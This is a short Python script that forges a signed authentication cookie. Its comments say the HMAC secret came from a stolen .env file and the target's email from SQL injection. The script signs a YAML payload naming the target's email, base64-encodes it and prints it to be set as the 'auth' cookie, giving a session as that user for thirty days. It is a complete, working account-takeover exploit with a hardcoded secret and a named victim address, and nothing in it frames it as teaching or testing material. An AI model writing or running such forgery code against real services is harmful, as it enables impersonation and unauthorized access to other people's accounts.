import yaml
import base64
import hmac
import hashlib
import time

#Taken from .env file
AUTH_SECRET = "862bfcb745b9a45f6d5a7c91492ce08a"

#Target user (retrieved from database using SQL injection)
TARGET_EMAIL = "lbrown@hotmail.com"
TARGET_USERNAME = "FORGED TOKEN USERNAME"

def gen_hmac(yaml_bytes):
    return hmac.new(AUTH_SECRET.encode('utf-8'), yaml_bytes, hashlib.sha256).digest()

def gen_token(username, email, expires_at):
    y = yaml.dump({'email': email, 'username': username, 'expires_at': expires_at}).encode('utf-8')
    h = gen_hmac(y)
    return base64.b64encode(h + y).decode()

expires_at = int(time.time()) + (60 * 60 * 24 * 30)
token = gen_token(TARGET_USERNAME, TARGET_EMAIL, expires_at)

print("Forged token for " + TARGET_EMAIL +"\n")
print(token)
print("\nSet as cookie named 'auth'")


